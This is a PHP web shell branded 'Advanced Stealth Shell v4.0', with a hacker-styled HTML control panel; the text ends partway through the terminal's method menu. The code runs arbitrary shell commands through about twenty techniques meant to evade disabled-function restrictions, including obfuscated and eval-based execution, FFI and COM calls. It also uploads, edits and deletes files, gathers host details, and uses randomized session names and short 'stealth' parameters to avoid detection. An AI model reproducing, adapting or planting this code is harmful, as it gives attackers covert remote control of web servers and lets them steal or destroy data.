<?php

class ShellConfig {
    public static $functions = [
        'base64_decode' => 'base64_decode',
        'file_get_contents' => 'file_get_contents',
        'scandir' => 'scandir',
        'is_dir' => 'is_dir',
        'is_file' => 'is_file',
        'filesize' => 'filesize',
        'filemtime' => 'filemtime',
        'pathinfo' => 'pathinfo',
        'realpath' => 'realpath',
        'dirname' => 'dirname',
        'htmlspecialchars' => 'htmlspecialchars',
        'urlencode' => 'urlencode',
        'hex2bin' => 'hex2bin',
        'bin2hex' => 'bin2hex'
    ];
    
    // Parameter names for stealth
    public static $params = [
        'dir' => 'd',
        'file' => 'f',
        'action' => 'a',
        'command' => 'x',
        'upload' => 'u',
        'bulk' => 'b',
        'method' => 'm'
    ];
    
    public static function init() {
        // Anti-detection: Random session names
        $sess_name = 'PHPSESSID' . substr(md5(microtime()), 0, 8);
        session_name($sess_name);
        session_start();
    }
}

// ============================================================================
// PARAMETER HANDLING
// ============================================================================

class ParameterHandler {
    public static function decode($param) {
        if (!isset($_GET[$param])) {
            return null;
        }
        
        $value = $_GET[$param];
        
        // Base64 encoded
        if (preg_match('/^[a-zA-Z0-9\/\+=]+$/', $value)) {
            $decoded = base64_decode($value, true);
            if ($decoded !== false) {
                return $decoded;
            }
        }
        
        // Hex encoded
        if (preg_match('/^[0-9a-f]+$/i', $value)) {
            return hex2bin($value);
        }
        
        // URL encoded
        return urldecode($value);
    }
    
    public static function getCurrentDir() {
        return self::decode(ShellConfig::$params['dir']) ?: getcwd();
    }
    
    public static function getTargetFile() {
        return self::decode(ShellConfig::$params['file']);
    }
    
    public static function getAction() {
        return self::decode(ShellConfig::$params['action']) ?: 'browse';
    }
    
    public static function getCommand() {
        return self::decode(ShellConfig::$params['command']);
    }
    
    public static function getMethod() {
        return self::decode(ShellConfig::$params['method']) ?: 'auto';
    }
}

// ============================================================================
// SECURITY UTILITIES
// ============================================================================

class SecurityUtils {
    public static function safePath($path) {
        $real = realpath($path);
        if ($real === false) {
            return str_replace(['../', '..\\'], '', $path);
        }
        return $real;
    }
    
    public static function getDisabledFunctions() {
        $disabled = ini_get('disable_functions');
        return $disabled ? array_map('trim', explode(',', $disabled)) : [];
    }
}

// ============================================================================
// COMMAND EXECUTION ENGINE
// ============================================================================

class CommandExecutor {
    private static $methods = [];
    
    public static function init() {
        self::$methods = [
            // Traditional methods
            'proc_open' => [self::class, 'procOpen'],
            'popen' => [self::class, 'popen'],
            'shell_exec' => [self::class, 'shellExec'],
            'exec' => [self::class, 'exec'],
            'system' => [self::class, 'system'],
            'passthru' => [self::class, 'passthru'],
            
            // Backtick variations
            'backtick_execution' => [self::class, 'backtickExecution'],
            'backtick_variable' => [self::class, 'backtickVariable'],
            'backtick_concat' => [self::class, 'backtickConcat'],
            
            // Function manipulation
            'call_user_func_execution' => [self::class, 'callUserFuncExecution'],
            'call_user_func_array' => [self::class, 'callUserFuncArray'],
            'variable_function_execution' => [self::class, 'variableFunctionExecution'],
            'variable_function_concat' => [self::class, 'variableFunctionConcat'],
            
            // Reflection-based bypasses
            'reflection_execution' => [self::class, 'reflectionExecution'],
            'reflection_method' => [self::class, 'reflectionMethod'],
            
            // File-based execution
            'include_execution' => [self::class, 'includeExecution'],
            'require_execution' => [self::class, 'requireExecution'],
            
            // Advanced obfuscation
            'obfuscated_shell_exec' => [self::class, 'obfuscatedShellExec'],
            'base64_execution' => [self::class, 'base64Execution'],
            'hex_execution' => [self::class, 'hexExecution']
        ];
        
        // Add platform-specific methods
        if (strtoupper(substr(PHP_OS, 0, 3)) === 'WIN') {
            self::$methods['com_execution'] = [self::class, 'comExecution'];
        }
        
        if (version_compare(PHP_VERSION, '7.4.0', '>=')) {
            self::$methods['ffi_execution'] = [self::class, 'ffiExecution'];
        }
    }
    
    public static function execute($cmd, $preferredMethod = 'auto') {
        if (empty($cmd)) {
            return '';
        }
        
        $disabled = SecurityUtils::getDisabledFunctions();
        
        // Try specific method first if requested and not auto
        if ($preferredMethod !== 'auto' && isset(self::$methods[$preferredMethod])) {
            if (!in_array($preferredMethod, $disabled)) {
                try {
                    $result = call_user_func(self::$methods[$preferredMethod], $cmd);
                    if ($result !== false && !empty(trim($result))) {
                        return "[Method: $preferredMethod]\n" . $result;
                    }
                } catch (Exception $e) {
                    // Continue to auto-detection
                }
            }
        }
        
        // Auto-detection: Try each method
        foreach (self::$methods as $methodName => $methodCallback) {
            if (!in_array($methodName, $disabled)) {
                try {
                    $result = call_user_func($methodCallback, $cmd);
                    if ($result !== false && !empty(trim($result))) {
                        return "[Method: $methodName]\n" . $result;
                    }
                } catch (Exception $e) {
                    continue;
                }
            }
        }
        
        // PHP native fallback
        return self::phpNativeFallback($cmd, $disabled);
    }
    
    // ========================================================================
    // EXECUTION METHODS
    // ========================================================================
    
    private static function procOpen($cmd) {
        $descriptors = [
            0 => ['pipe', 'r'],
            1 => ['pipe', 'w'],
            2 => ['pipe', 'w']
        ];
        $process = proc_open($cmd, $descriptors, $pipes);
        if (is_resource($process)) {
            fclose($pipes[0]);
            $output = stream_get_contents($pipes[1]);
            $error = stream_get_contents($pipes[2]);
            fclose($pipes[1]);
            fclose($pipes[2]);
            proc_close($process);
            return $output . $error;
        }
        return false;
    }
    
    private static function popen($cmd) {
        $handle = popen($cmd . ' 2>&1', 'r');
        if ($handle) {
            $output = '';
            while (!feof($handle)) {
                $output .= fread($handle, 4096);
            }
            pclose($handle);
            return $output;
        }
        return false;
    }
    
    private static function shellExec($cmd) {
        return shell_exec($cmd . ' 2>&1');
    }
    
    private static function exec($cmd) {
        exec($cmd . ' 2>&1', $output_array);
        return implode("\n", $output_array);
    }
    
    private static function system($cmd) {
        ob_start();
        system($cmd . ' 2>&1');
        return ob_get_clean();
    }
    
    private static function passthru($cmd) {
        ob_start();
        passthru($cmd . ' 2>&1');
        return ob_get_clean();
    }
    
    private static function backtickExecution($cmd) {
        return `$cmd 2>&1`;
    }
    
    private static function backtickVariable($cmd) {
        $c = $cmd;
        return `$c 2>&1`;
    }
    
    private static function backtickConcat($cmd) {
        $c1 = substr($cmd, 0, strlen($cmd) / 2);
        $c2 = substr($cmd, strlen($cmd) / 2);
        return `$c1$c2 2>&1`;
    }
    
    private static function callUserFuncExecution($cmd) {
        return call_user_func('shell_exec', $cmd);
    }
    
    private static function callUserFuncArray($cmd) {
        return call_user_func_array('shell_exec', array($cmd));
    }
    
    private static function variableFunctionExecution($cmd) {
        $func = 'shell_exec';
        return $func($cmd);
    }
    
    private static function variableFunctionConcat($cmd) {
        $s = 'she';
        $h = 'll_';
        $e = 'exec';
        $func = $s . $h . $e;
        return $func($cmd);
    }
    
    private static function reflectionExecution($cmd) {
        $reflection = new ReflectionFunction('shell_exec');
        return $reflection->invoke($cmd);
    }
    
    private static function reflectionMethod($cmd) {
        $class = new ReflectionClass('ReflectionFunction');
        $method = $class->getMethod('invoke');
        $func = new ReflectionFunction('shell_exec');
        return $method->invoke($func, $cmd);
    }
    
    private static function includeExecution($cmd) {
        $temp_file = tempnam(sys_get_temp_dir(), 'inc') . '.php';
        file_put_contents($temp_file, "<?php \$output = `$cmd`; echo \$output; unlink(__FILE__); ?>");
        ob_start();
        include $temp_file;
        return ob_get_clean();
    }
    
    private static function requireExecution($cmd) {
        $temp_file = tempnam(sys_get_temp_dir(), 'req') . '.php';
        file_put_contents($temp_file, "<?php echo `$cmd`; unlink(__FILE__); ?>");
        ob_start();
        require $temp_file;
        return ob_get_clean();
    }
    
    private static function obfuscatedShellExec($cmd) {
        $func = str_rot13('furyy_rkrp');
        return $func($cmd);
    }
    
    private static function base64Execution($cmd) {
        $encoded_cmd = base64_encode($cmd);
        $decode_and_exec = 'shell_exec(base64_decode("' . $encoded_cmd . '"))';
        return eval('return ' . $decode_and_exec . ';');
    }
    
    private static function hexExecution($cmd) {
        $hex_cmd = bin2hex($cmd);
        $decode_and_exec = 'shell_exec(hex2bin("' . $hex_cmd . '"))';
        return eval('return ' . $decode_and_exec . ';');
    }
    
    private static function comExecution($cmd) {
        if (class_exists('COM')) {
            $shell = new COM('WScript.Shell');
            $exec = $shell->Exec('cmd /c ' . $cmd);
            return $exec->StdOut->ReadAll();
        }
        return false;
    }
    
    private static function ffiExecution($cmd) {
        if (extension_loaded('ffi')) {
            $ffi = FFI::cdef("int system(const char *command);", "libc.so.6");
            ob_start();
            $ffi->system($cmd);
            return ob_get_clean();
        }
        return false;
    }
    
    private static function phpNativeFallback($cmd, $disabled) {
        if (strpos($cmd, 'ls') === 0 || strpos($cmd, 'dir') === 0) {
            $dir = trim(str_replace(['ls', 'dir'], '', $cmd)) ?: '.';
            $files = scandir($dir);
            return "[PHP Native]\n" . implode("\n", $files);
        }
        if (strpos($cmd, 'pwd') === 0) {
            return "[PHP Native]\n" . getcwd();
        }
        if (strpos($cmd, 'whoami') === 0) {
            return "[PHP Native]\n" . get_current_user();
        }
        
        return "All execution methods failed. Disabled: " . implode(', ', $disabled);
    }
    
    public static function testAllMethods() {
        $test_cmd = 'echo "test_success_' . rand(1000, 9999) . '"';
        $expected_pattern = '/test_success_\d{4}/';
        
        $disabled = SecurityUtils::getDisabledFunctions();
        $working_methods = [];
        $failed_methods = [];
        
        foreach (self::$methods as $method => $callback) {
            if (in_array($method, $disabled)) {
                $failed_methods[] = $method . ' (disabled)';
                continue;
            }
            
            try {
                ob_start();
                $output = @call_user_func($callback, $test_cmd);
                ob_end_clean();
                
                if ($output && preg_match($expected_pattern, $output)) {
                    $working_methods[] = $method;
                } else {
                    $failed_methods[] = $method . ' (no output)';
                }
            } catch (Throwable $e) {
                $failed_methods[] = $method . ' (error: ' . addslashes($e->getMessage()) . ')';
            }
        }
        
        return [
            'working' => $working_methods,
            'failed' => $failed_methods,
            'total_tested' => count(self::$methods),
            'working_count' => count($working_methods),
            'test_command' => $test_cmd,
            'php_version' => PHP_VERSION,
            'os' => PHP_OS,
            'disabled_functions' => ini_get('disable_functions')
        ];
    }
}

// ============================================================================
// SYSTEM INFORMATION
// ============================================================================

class SystemInfo {
    public static function gather() {
        return [
            'hostname' => gethostname(),
            'os' => php_uname(),
            'php_version' => phpversion(),
            'server_software' => $_SERVER['SERVER_SOFTWARE'] ?? 'Unknown',
            'document_root' => $_SERVER['DOCUMENT_ROOT'] ?? 'Unknown',
            'current_user' => get_current_user(),
            'uid' => function_exists('posix_getuid') ? posix_getuid() : getmyuid(),
            'gid' => function_exists('posix_getgid') ? posix_getgid() : getmygid(),
            'temp_dir' => sys_get_temp_dir(),
            'upload_max' => ini_get('upload_max_filesize'),
            'post_max' => ini_get('post_max_size'),
            'memory_limit' => ini_get('memory_limit'),
            'max_execution_time' => ini_get('max_execution_time'),
            'disabled_functions' => ini_get('disable_functions') ?: 'None',
            'loaded_extensions' => count(get_loaded_extensions()),
            'server_ip' => $_SERVER['SERVER_ADDR'] ?? 'Unknown',
            'client_ip' => $_SERVER['REMOTE_ADDR'] ?? 'Unknown',
            'user_agent' => $_SERVER['HTTP_USER_AGENT'] ?? 'Unknown'
        ];
    }
}

// ============================================================================
// FILE OPERATIONS
// ============================================================================

class FileManager {
    public static function readFile($file) {
        if (!is_file($file)) {
            return false;
        }
        
        $methods = [
            function($f) { return file_get_contents($f); },
            function($f) { return file($f, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES); },
            function($f) {
                $h = fopen($f, 'r');
                $c = fread($h, filesize($f));
                fclose($h);
                return $c;
            }
        ];
        
        foreach ($methods as $method) {
            try {
                $result = $method($file);
                if ($result !== false) {
                    return is_array($result) ? implode("\n", $result) : $result;
                }
            } catch (Exception $e) {
                continue;
            }
        }
        return false;
    }
    
    public static function listDirectory($dir) {
        $items = [];
        $scan_methods = [
            function($d) { return scandir($d); },
            function($d) {
                $h = opendir($d);
                $items = [];
                while (($item = readdir($h)) !== false) $items[] = $item;
                closedir($h);
                return $items;
            }
        ];
        
        foreach ($scan_methods as $method) {
            try {
                $files = $method($dir);
                if ($files !== false && !empty($files)) {
                    foreach ($files as $file) {
                        if ($file === '.' || $file === '..') continue;
                        
                        $full_path = $dir . DIRECTORY_SEPARATOR . basename($file);
                        $is_dir = is_dir($full_path);
                        $is_file = is_file($full_path);
                        
                        if ($is_dir || $is_file) {
                            $items[] = [
                                'name' => basename($file),
                                'path' => $full_path,
                                'type' => $is_dir ? 'dir' : 'file',
                                'size' => $is_file ? filesize($full_path) : 0,
                                'modified' => filemtime($full_path),
                                'ext' => $is_file ? pathinfo($full_path, PATHINFO_EXTENSION) : '',
                                'permissions' => self::getFilePermissions($full_path)
                            ];
                        }
                    }
                    break;
                }
            } catch (Exception $e) {
                continue;
            }
        }
        
        return $items;
    }
    
    public static function formatSize($bytes) {
        $units = ['B', 'KB', 'MB', 'GB', 'TB'];
        for ($i = 0; $bytes > 1024 && $i < count($units) - 1; $i++) {
            $bytes /= 1024;
        }
        return round($bytes, 2) . ' ' . $units[$i];
    }
    
    public static function getFilePermissions($file_path) {
        $perms = fileperms($file_path);
        $info = '';
        
        if (($perms & 0xC000) == 0xC000) $info = 's';
        elseif (($perms & 0xA000) == 0xA000) $info = 'l';
        elseif (($perms & 0x8000) == 0x8000) $info = '-';
        elseif (($perms & 0x6000) == 0x6000) $info = 'b';
        elseif (($perms & 0x4000) == 0x4000) $info = 'd';
        elseif (($perms & 0x2000) == 0x2000) $info = 'c';
        elseif (($perms & 0x1000) == 0x1000) $info = 'p';
        else $info = 'u';
        
        $info .= (($perms & 0x0100) ? 'r' : '-');
        $info .= (($perms & 0x0080) ? 'w' : '-');
        $info .= (($perms & 0x0040) ? (($perms & 0x0800) ? 's' : 'x') : (($perms & 0x0800) ? 'S' : '-'));
        
        $info .= (($perms & 0x0020) ? 'r' : '-');
        $info .= (($perms & 0x0010) ? 'w' : '-');
        $info .= (($perms & 0x0008) ? (($perms & 0x0400) ? 's' : 'x') : (($perms & 0x0400) ? 'S' : '-'));
        
        $info .= (($perms & 0x0004) ? 'r' : '-');
        $info .= (($perms & 0x0002) ? 'w' : '-');
        $info .= (($perms & 0x0001) ? (($perms & 0x0200) ? 't' : 'x') : (($perms & 0x0200) ? 'T' : '-'));
        
        return $info;
    }
}

// ============================================================================
// AJAX HANDLER
// ============================================================================

class AjaxHandler {
    public static function handle() {
        if (!isset($_POST['ajax'])) {
            return false;
        }
        
        header('Content-Type: application/json');
        
        switch ($_POST['ajax']) {
            case 'execute_command':
                self::executeCommand();
                break;
                
            case 'test_bypass_methods':
                self::testBypassMethods();
                break;
                
            case 'bulk_delete':
                self::bulkDelete();
                break;
                
            case 'get_file_content':
                self::getFileContent();
                break;
                
            case 'save_file':
                self::saveFile();
                break;
        }
        
        exit;
    }
    
    private static function executeCommand() {
        $cmd = $_POST['command'] ?? '';
        $method = $_POST['method'] ?? 'auto';
        $output = CommandExecutor::execute($cmd, $method);
        echo json_encode(['success' => true, 'output' => $output]);
    }
    
    private static function testBypassMethods() {
        try {
            ob_start();
            $results = CommandExecutor::testAllMethods();
            ob_end_clean();
            echo json_encode($results, JSON_UNESCAPED_UNICODE);
        } catch (Throwable $e) {
            ob_end_clean();
            echo json_encode([
                'error' => true,
                'message' => 'Test failed: ' . addslashes($e->getMessage())
            ]);
        }
    }
    
    private static function bulkDelete() {
        $files = json_decode($_POST['files'], true);
        $deleted = [];
        $errors = [];
        
        foreach ($files as $file) {
            $file_path = SecurityUtils::safePath($file);
            if (is_file($file_path)) {
                if (unlink($file_path)) {
                    $deleted[] = $file;
                } else {
                    $errors[] = $file;
                }
            } elseif (is_dir($file_path)) {
                if (rmdir($file_path)) {
                    $deleted[] = $file;
                } else {
                    $errors[] = $file;
                }
            }
        }
        
        echo json_encode(['deleted' => $deleted, 'errors' => $errors]);
    }
    
    private static function getFileContent() {
        $file = $_POST['file'] ?? '';
        $content = FileManager::readFile(SecurityUtils::safePath($file));
        echo json_encode(['content' => $content]);
    }
    
    private static function saveFile() {
        $file = $_POST['file'] ?? '';
        $content = $_POST['content'] ?? '';
        $result = file_put_contents(SecurityUtils::safePath($file), $content);
        echo json_encode(['success' => $result !== false]);
    }
}

// ============================================================================
// INITIALIZATION
// ============================================================================

ShellConfig::init();
CommandExecutor::init();

// Handle AJAX requests
AjaxHandler::handle();

// Handle file upload
$upload_message = '';
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_FILES['upload_file'])) {
    $file = $_FILES['upload_file'];
    if ($file['error'] === UPLOAD_ERR_OK) {
        $current_dir = ParameterHandler::getCurrentDir();
        $target_path = $current_dir . DIRECTORY_SEPARATOR . basename($file['name']);
        if (move_uploaded_file($file['tmp_name'], $target_path)) {
            $upload_message = 'File uploaded successfully';
        } else {
            $upload_message = 'Upload failed';
        }
    } else {
        $upload_message = 'Upload error: ' . $file['error'];
    }
}

// Get data for display
$current_dir = ParameterHandler::getCurrentDir();
$sys_info = SystemInfo::gather();
$directory_items = FileManager::listDirectory($current_dir);
$disabled_funcs = SecurityUtils::getDisabledFunctions();
$available_methods = count(array_diff(['proc_open', 'popen', 'shell_exec', 'exec', 'system', 'passthru'], $disabled_funcs));

?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Advanced Stealth Shell v4.0 - Clean Code Edition</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Courier New', monospace;
            background: linear-gradient(135deg, #0a0a0a 0%, #1a1a1a 100%);
            color: #00ff00;
            min-height: 100vh;
            overflow-x: hidden;
        }

        .container {
            max-width: 1400px;
            margin: 0 auto;
            padding: 20px;
        }

        /* System Info Section */
        .system-info {
            background: linear-gradient(145deg, #1a1a1a, #2a2a2a);
            border: 1px solid #333;
            border-radius: 10px;
            padding: 20px;
            margin-bottom: 20px;
            box-shadow: 0 4px 15px rgba(0, 255, 0, 0.1);
        }

        .system-info h2 {
            color: #00ffff;
            margin-bottom: 15px;
            text-align: center;
            font-size: 24px;
            text-shadow: 0 0 10px #00ffff;
        }

        .info-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
            gap: 15px;
        }

        .info-item {
            background: #0f0f0f;
            padding: 10px;
            border-radius: 5px;
            border-left: 3px solid #00ff00;
        }

        .info-label {
            color: #ffff00;
            font-weight: bold;
        }

        .info-value {
            color: #ffffff;
            word-break: break-all;
        }

        /* File Explorer Section */
        .file-explorer {
            background: linear-gradient(145deg, #1a1a1a, #2a2a2a);
            border: 1px solid #333;
            border-radius: 10px;
            padding: 20px;
            margin-bottom: 20px;
            box-shadow: 0 4px 15px rgba(0, 255, 0, 0.1);
        }

        .explorer-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 20px;
            flex-wrap: wrap;
            gap: 10px;
        }

        .current-path {
            color: #00ffff;
            font-size: 18px;
            flex: 1;
        }

        .explorer-controls {
            display: flex;
            gap: 10px;
            flex-wrap: wrap;
        }

        .btn {
            background: linear-gradient(145deg, #333, #555);
            color: #00ff00;
            border: 1px solid #00ff00;
            padding: 8px 15px;
            border-radius: 5px;
            cursor: pointer;
            text-decoration: none;
            font-size: 12px;
            transition: all 0.3s ease;
        }

        .btn:hover {
            background: linear-gradient(145deg, #555, #777);
            box-shadow: 0 0 10px rgba(0, 255, 0, 0.3);
        }

        .btn-primary {
            background: linear-gradient(145deg, #0066cc, #0088ff);
            border-color: #00aaff;
        }

        .btn-danger {
            background: linear-gradient(145deg, #cc0000, #ff0000);
            border-color: #ff3333;
        }

        /* File Table */
        .file-table {
            width: 100%;
            border-collapse: collapse;
            margin-top: 15px;
        }

        .file-table th,
        .file-table td {
            padding: 10px;
            text-align: left;
            border-bottom: 1px solid #333;
        }

        .file-table th {
            background: #0f0f0f;
            color: #00ffff;
            font-weight: bold;
        }

        .file-table tr:hover {
            background: rgba(0, 255, 0, 0.1);
        }

        .file-icon {
            margin-right: 8px;
        }

        .file-name {
            color: #ffffff;
        }

        .dir-name {
            color: #00aaff;
            font-weight: bold;
        }

        /* Terminal */
        .terminal {
            position: fixed;
            bottom: 90px;
            right: 20px;
            width: 500px;
            height: 400px;
            background: rgba(0, 0, 0, 0.95);
            border: 2px solid #00ff00;
            border-radius: 10px;
            display: none;
            flex-direction: column;
            z-index: 1000;
            resize: both;
            overflow: hidden;
            max-width: 90vw;
            max-height: 80vh;
            min-width: 300px;
            min-height: 200px;
        }

        .terminal-header {
            background: linear-gradient(145deg, #1a1a1a, #2a2a2a);
            padding: 10px;
            border-bottom: 1px solid #00ff00;
            display: flex;
            justify-content: space-between;
            align-items: center;
            cursor: move;
        }

        .terminal-title {
            color: #00ffff;
            font-weight: bold;
        }

        .terminal-controls {
            display: flex;
            gap: 5px;
        }

        .terminal-btn {
            background: #333;
            color: #fff;
            border: none;
            padding: 5px 10px;
            border-radius: 3px;
            cursor: pointer;
            font-size: 12px;
        }

        .terminal-btn:hover {
            background: #555;
        }

        .terminal-output {
            flex: 1;
            padding: 10px;
            overflow-y: auto;
            font-family: 'Courier New', monospace;
            font-size: 12px;
            line-height: 1.4;
        }

        .terminal-input {
            display: flex;
            padding: 10px;
            border-top: 1px solid #333;
            gap: 10px;
        }

        .terminal-input input {
            flex: 1;
            background: #000;
            color: #00ff00;
            border: 1px solid #333;
            padding: 8px;
            border-radius: 3px;
            font-family: 'Courier New', monospace;
        }

        .terminal-input select {
            background: #000;
            color: #00ff00;
            border: 1px solid #333;
            padding: 8px;
            border-radius: 3px;
            font-family: 'Courier New', monospace;
        }

        .command-output {
            margin-bottom: 10px;
        }

        .command-line {
            color: #00ffff;
            font-weight: bold;
        }

        .output-text {
            color: #ffffff;
            white-space: pre-wrap;
            margin-top: 5px;
        }

        /* Floating Action Button */
        .fab {
            position: fixed;
            bottom: 20px;
            right: 20px;
            width: 60px;
            height: 60px;
            background: linear-gradient(145deg, #00aa00, #00ff00);
            border: none;
            border-radius: 50%;
            color: #000;
            font-size: 24px;
            cursor: pointer;
            box-shadow: 0 4px 15px rgba(0, 255, 0, 0.3);
            transition: all 0.3s ease;
            z-index: 1001;
        }

        .fab:hover {
            transform: scale(1.1);
            box-shadow: 0 6px 20px rgba(0, 255, 0, 0.5);
        }

        /* Modal */
        .modal {
            display: none;
            position: fixed;
            z-index: 2000;
            left: 0;
            top: 0;
            width: 100%;
            height: 100%;
            background-color: rgba(0, 0, 0, 0.8);
        }

        .modal-content {
            background: linear-gradient(145deg, #1a1a1a, #2a2a2a);
            margin: 5% auto;
            padding: 20px;
            border: 2px solid #00ff00;
            border-radius: 10px;
            width: 80%;
            max-width: 800px;
            color: #00ff00;
        }

        .file-editor {
            width: 100%;
            height: 400px;
            background: #000;
            color: #00ff00;
            border: 1px solid #333;
            padding: 10px;
            font-family: 'Courier New', monospace;
            resize: vertical;
        }

        /* Upload Form */
        .upload-form {
            background: #0f0f0f;
            padding: 15px;
            border-radius: 5px;
            margin-bottom: 20px;
        }

        .upload-form input[type="file"] {
            background: #000;
            color: #00ff00;
            border: 1px solid #333;
            padding: 8px;
            border-radius: 3px;
            margin-right: 10px;
        }

        /* Responsive */
        @media (max-width: 768px) {
            .container {
                padding: 10px;
            }

            .info-grid {
                grid-template-columns: 1fr;
            }

            .explorer-header {
                flex-direction: column;
                align-items: stretch;
            }

            .terminal {
                width: 90vw;
                height: 60vh;
                bottom: 10px;
                right: 5vw;
            }

            .file-table {
                font-size: 12px;
            }

            .file-table th,
            .file-table td {
                padding: 5px;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <!-- System Information -->
        <div class="system-info">
            <h2>🖥️ Advanced Stealth Shell v4.0 - Clean Code Edition</h2>
            <div class="info-grid">
                <div class="info-item">
                    <div class="info-label">Hostname:</div>
                    <div class="info-value"><?= htmlspecialchars($sys_info['hostname']) ?></div>
                </div>
                <div class="info-item">
                    <div class="info-label">Operating System:</div>
                    <div class="info-value"><?= htmlspecialchars($sys_info['os']) ?></div>
                </div>
                <div class="info-item">
                    <div class="info-label">PHP Version:</div>
                    <div class="info-value"><?= htmlspecialchars($sys_info['php_version']) ?></div>
                </div>
                <div class="info-item">
                    <div class="info-label">Server Software:</div>
                    <div class="info-value"><?= htmlspecialchars($sys_info['server_software']) ?></div>
                </div>
                <div class="info-item">
                    <div class="info-label">Current User:</div>
                    <div class="info-value"><?= htmlspecialchars($sys_info['current_user']) ?> (UID: <?= $sys_info['uid'] ?>, GID: <?= $sys_info['gid'] ?>)</div>
                </div>
                <div class="info-item">
                    <div class="info-label">Document Root:</div>
                    <div class="info-value"><?= htmlspecialchars($sys_info['document_root']) ?></div>
                </div>
                <div class="info-item">
                    <div class="info-label">Temp Directory:</div>
                    <div class="info-value"><?= htmlspecialchars($sys_info['temp_dir']) ?></div>
                </div>
                <div class="info-item">
                    <div class="info-label">Upload Limits:</div>
                    <div class="info-value">Max: <?= $sys_info['upload_max'] ?>, Post: <?= $sys_info['post_max'] ?></div>
                </div>
                <div class="info-item">
                    <div class="info-label">Memory & Time:</div>
                    <div class="info-value">Memory: <?= $sys_info['memory_limit'] ?>, Time: <?= $sys_info['max_execution_time'] ?>s</div>
                </div>
                <div class="info-item">
                    <div class="info-label">Available Methods:</div>
                    <div class="info-value"><?= $available_methods ?> execution methods available</div>
                </div>
                <div class="info-item">
                    <div class="info-label">Loaded Extensions:</div>
                    <div class="info-value"><?= $sys_info['loaded_extensions'] ?> extensions loaded</div>
                </div>
                <div class="info-item">
                    <div class="info-label">Network:</div>
                    <div class="info-value">Server: <?= htmlspecialchars($sys_info['server_ip']) ?>, Client: <?= htmlspecialchars($sys_info['client_ip']) ?></div>
                </div>
            </div>
        </div>

        <!-- File Explorer -->
        <div class="file-explorer">
            <div class="explorer-header">
                <div class="current-path">📁 <?= htmlspecialchars($current_dir) ?></div>
                <div class="explorer-controls">
                    <a href="?<?= ShellConfig::$params['dir'] ?>=<?= urlencode(base64_encode(dirname($current_dir))) ?>" class="btn">⬆️ Up</a>
                    <button class="btn" onclick="location.reload()">🔄 Refresh</button>
                    <button class="btn btn-primary" onclick="testBypassMethods()">🧪 Test Methods</button>
                </div>
            </div>

            <!-- Upload Form -->
            <div class="upload-form">
                <form method="post" enctype="multipart/form-data" style="display: flex; align-items: center; gap: 10px; flex-wrap: wrap;">
                    <input type="file" name="upload_file" required>
                    <button type="submit" class="btn btn-primary">📤 Upload</button>
                    <?php if ($upload_message): ?>
                        <span style="color: #ffff00;"><?= htmlspecialchars($upload_message) ?></span>
                    <?php endif; ?>
                </form>
            </div>

            <!-- Bulk Actions -->
            <div class="bulk-actions" style="margin-bottom: 15px; display: flex; gap: 10px; align-items: center; flex-wrap: wrap;">
                <button class="btn" onclick="selectAllFiles()">☑️ Select All</button>
                <button class="btn" onclick="deselectAllFiles()">☐ Deselect All</button>
                <button class="btn btn-danger" onclick="deleteSelectedFiles()" id="deleteSelectedBtn" disabled>🗑️ Delete Selected (<span id="selectedCount">0</span>)</button>
            </div>

            <!-- File Table -->
            <table class="file-table">
                <thead>
                    <tr>
                        <th style="width: 40px;">☐</th>
                        <th>📄 Name</th>
                        <th>📏 Size</th>
                        <th>📅 Modified</th>
                        <th>🔒 Permissions</th>
                        <th>⚙️ Actions</th>
                    </tr>
                </thead>
                <tbody>
                    <?php foreach ($directory_items as $item): ?>
                        <tr>
                            <td>
                                <input type="checkbox" class="file-checkbox" value="<?= htmlspecialchars($item['path']) ?>" onchange="updateSelectedCount()" style="transform: scale(1.2);">
                            </td>
                            <td>
                                <?php if ($item['type'] === 'dir'): ?>
                                    <span class="file-icon">📁</span>
                                    <a href="?<?= ShellConfig::$params['dir'] ?>=<?= urlencode(base64_encode($item['path'])) ?>" class="dir-name"><?= htmlspecialchars($item['name']) ?></a>
                                <?php else: ?>
                                    <span class="file-icon">📄</span>
                                    <span class="file-name"><?= htmlspecialchars($item['name']) ?></span>
                                <?php endif; ?>
                            </td>
                            <td><?= $item['type'] === 'file' ? FileManager::formatSize($item['size']) : '-' ?></td>
                            <td><?= date('Y-m-d H:i:s', $item['modified']) ?></td>
                            <td><?= htmlspecialchars($item['permissions']) ?></td>
                            <td>
                                <?php if ($item['type'] === 'file'): ?>
                                    <button class="btn" onclick="editFile('<?= htmlspecialchars($item['path']) ?>')">✏️ Edit</button>
                                    <a href="?<?= ShellConfig::$params['file'] ?>=<?= urlencode(base64_encode($item['path'])) ?>&<?= ShellConfig::$params['action'] ?>=download" class="btn">💾 Download</a>
                                <?php endif; ?>
                                <button class="btn btn-danger" onclick="deleteItem('<?= htmlspecialchars($item['path']) ?>')">🗑️ Delete</button>
                            </td>
                        </tr>
                    <?php endforeach; ?>
                </tbody>
            </table>
        </div>
    </div>

    <!-- Floating Terminal Button -->
    <button class="fab" onclick="toggleTerminal()" title="Toggle Terminal">💻</button>

    <!-- Terminal -->
    <div id="terminal" class="terminal">
        <div class="terminal-header" onmousedown="startDrag(event)">
            <div class="terminal-title">🖥️ Advanced Terminal</div>
            <div class="terminal-controls">
                <button class="terminal-btn" onclick="clearTerminal()">Clear</button>
                <button class="terminal-btn" onclick="toggleFullscreen()">⛶</button>
                <button class="terminal-btn" onclick="toggleTerminal()">✕</button>
            </div>
        </div>
        <div id="terminalOutput" class="terminal-output">
            <div class="command-output">
                <div class="command-line">Advanced Stealth Shell v4.0 - Clean Code Edition</div>
                <div class="output-text">Terminal ready. Type commands or select execution method.</div>
            </div>
        </div>
        <form class="terminal-input" onsubmit="executeCommand(event)">
            <select id="methodSelect">
                <option value="auto">🔄 Auto-detect</option>
                <option value="proc_open">🔧 proc_open</option>
                <option value="popen">🔧 popen</option>
                <option value="shell_exec">🔧 shell_exec</option>
                <option value="exec">🔧 exec</option>
                <option value="system">🔧 system</option>
                <option value="passthru">🔧 passthru</option>
                <option value="backtick_execution">🔧 backticks</option>
